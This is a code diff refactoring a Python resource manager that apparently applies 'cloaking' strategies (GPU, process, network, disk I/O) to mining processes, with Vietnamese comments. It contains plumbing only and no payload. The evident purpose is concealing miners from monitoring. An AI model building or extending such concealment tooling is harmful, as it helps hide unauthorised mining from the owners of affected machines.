@@ -287,12 +287,6 @@ class ResourceManager(IResourceManager):
         """**Check GPU Initialization** (kiểm tra khởi tạo GPU)"""
         return self.shared_resource_manager and self.shared_resource_manager.is_nvml_initialized()
 
-    def handle_resource_adjustment(self, event_data: Dict[str, Any]):
-        """**Handle Resource Adjustment** (xử lý điều chỉnh tài nguyên)"""
-        try:
-            self.resource_adjustment_queue.put(event_data, block=False)
-        except queue.Full:
-            self.logger.warning("Resource adjustment queue đầy")
 
     def _ensure_shared_resource_manager(self) -> bool:
         """**Lazy Initialize SharedResourceManager** (khởi tạo lười SharedResourceManager)
@@ -397,84 +391,60 @@ class ResourceManager(IResourceManager):
             self.logger.error(f"Lỗi xử lý process registration: {e}")
 
     def trigger_cloaking(self, process: MiningProcess, source: str = 'unknown') -> bool:
-        """Simplified trigger cloaking using new linear pipeline"""
+        """
+        Kích hoạt cloaking cho một `MiningProcess`.
+
+        Stage 1 (ResourceManager):
+        • Tạo `CloakRequest` tối thiểu chỉ chứa `pid` + `metadata`.
+        • Forward trực tiếp sang `CloakCoordinator` (Stage 2) – nơi quyết định strategy và chuẩn bị tham số.
+
+        Parameters
+        ----------
+        process : MiningProcess
+            Tiến trình cần cloaking.
+        source : str, optional
+            Nguồn gọi cloaking (observer/file scanner…), mặc định "unknown".
+
+        Returns
+        -------
+        bool
+            `True` nếu cloaking thành công, ngược lại `False`.
+        """
         try:
-            self.logger.info(f"[RM] Stage 1: Trigger cloaking for PID {process.pid} from source: {source}")
-            
-            # Ensure we have a coordinator
-            if not hasattr(self, 'cloak_coordinator'):
+            self.logger.info(
+                f"[RM] Stage 1: Trigger cloaking for PID {process.pid} (source={source})"
+            )
+
+            # Lazy-init coordinator
+            if not hasattr(self, "cloak_coordinator"):
                 self.cloak_coordinator = CloakCoordinator(self.config)
                 self.logger.info("[RM] Initialized CloakCoordinator")
-            
-            # Stage 1: Create MINIMAL request - chỉ PID & metadata
-            # KHÔNG quyết định strategy, KHÔNG prepare params!
+
+            # Build minimal request (Stage 1)
             request = CloakRequest(
                 pid=process.pid,
-                strategy_name=None,  # Let Stage 2 decide based on config
-                params={},           # Let Stage 2 prepare based on strategy
-                metadata={'source': source, 'process_name': process.name}
+                strategy_name=None,  # Stage 2 sẽ quyết định
+                params={},
+                metadata={"source": source, "process_name": process.name},
             )
-            
-            self.logger.info(f"[RM] Created minimal request for PID {process.pid}")
-            
-            # Stage 2: Forward to coordinator
+
+            self.logger.debug(f"[RM] Built CloakRequest: {request.to_dict()}")
+
+            # Forward to Stage 2 – Coordinator
             result = self.cloak_coordinator.process_request(request)
-            
+
             if result.success:
                 self.logger.info(f"[RM] ✅ Cloaking successful for PID {process.pid}")
-                self.logger.info(f"[RM] Applied controls: {result.applied_controls}")
+                self.logger.debug(f"[RM] Applied controls: {result.applied_controls}")
             else:
                 self.logger.error(f"[RM] ❌ Cloaking failed: {result.error_msg}")
-            
+
+            return result.success
+
         except Exception as e:
             self.logger.error(f"[RM] Exception in trigger_cloaking: {e}")
             import traceback
             self.logger.debug(f"[RM] Traceback: {traceback.format_exc()}")
-            return False
-
-
-        
-        try:
-            self.logger.debug(f"Determining strategies for process: {process.name}")
-            
-            # Get strategies from configuration
-            if hasattr(self.config, 'cloaking_strategies'):
-                # Extract enabled strategies from configuration dictionary
-                if isinstance(self.config.cloaking_strategies, dict):
-                    for strategy_name, strategy_config in self.config.cloaking_strategies.items():
-                        if isinstance(strategy_config, dict) and strategy_config.get('enabled', True):
-                            strategies.append(strategy_name)
-                        elif strategy_config is True:
-                            strategies.append(strategy_name)
-                else:
-                    # Fallback for list-based configuration
-                    strategies = list(self.config.cloaking_strategies)
-            else:
-                strategies = ['gpu_cloaking', 'process_cloaking']
-                self.logger.warning(f"No cloaking strategies in config, using defaults: {strategies}")
-
-            # Filter strategies by availability
-            available_strategies = [
-                strategy for strategy in strategies 
-                if self._is_strategy_available(strategy)
-            ]
-            
-            self.logger.debug(f"Available strategies: {available_strategies}")
-            return available_strategies
-            
-        except Exception as e:
-            self.logger.error(f"Error determining strategies: {e}")
-            return ['gpu_cloaking']  # Fallback to default strategy
-
-
-        """Check if the specified strategy is available for use"""
-        try:
-            # Simple validation of known strategy names
-            known_strategies = ['gpu', 'network', 'disk_io', 'cache', 'memory']
-            return strategy_name.lower() in known_strategies
-            
-        except Exception as e:
-            self.logger.debug(f"Strategy '{strategy_name}' validation error: {e}")
             return False
 
     def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
@@ -550,15 +520,7 @@ class ResourceManager(IResourceManager):
 
     def _start_workers(self):
         """**Start Worker Threads** (khởi động worker threads)"""
-        # **Start Resource Adjustment Worker** (khởi động worker điều chỉnh tài nguyên)
-        resource_worker = threading.Thread(
-            target=self.process_resource_adjustments,
-            name="ResourceAdjustmentWorker",
-            daemon=True
-        )
-        resource_worker.start()
-        self.workers.append(resource_worker)
-        
+
         # **🥇 SOLUTION 1: Add Persistent Monitoring Thread** (thêm thread giám sát liên tục)
         monitoring_worker = threading.Thread(
             target=self._persistent_monitoring_loop,
@@ -589,22 +551,6 @@ class ResourceManager(IResourceManager):
             self.logger.info("✅ [SOLUTION-1] PID File Scanner worker thread started")
         
         self.logger.info(f"Worker threads đã khởi động: {len(self.workers)} threads active")
-
-    def process_resource_adjustments(self):
-        """**Process Resource Adjustments** (xử lý điều chỉnh tài nguyên)"""
-        while not self._stop_flag:
-            try:
-                event_data = self.resource_adjustment_queue.get(timeout=1.0)
-                
-                # **Process Adjustment** (xử lý điều chỉnh)
-                self.logger.debug(f"Xử lý resource adjustment: {event_data}")
-                
-                self.resource_adjustment_queue.task_done()
-                
-            except queue.Empty:
-                continue
-            except Exception as e:
-                self.logger.error(f"Lỗi xử lý resource adjustment: {e}")
 
     def shutdown(self):
         """**Shutdown ResourceManager** (tắt ResourceManager)"""
@@ -844,8 +790,6 @@ class ResourceManager(IResourceManager):
         except Exception as e:
             self.logger.error(f"❌ [MONITOR] Monitoring cycle failed: {e}")
     
-
-
     def _start_pid_file_scanner(self):
         """
         **🥇 SOLUTION 1: PID File Scanner Thread** (thread scanner file PID)
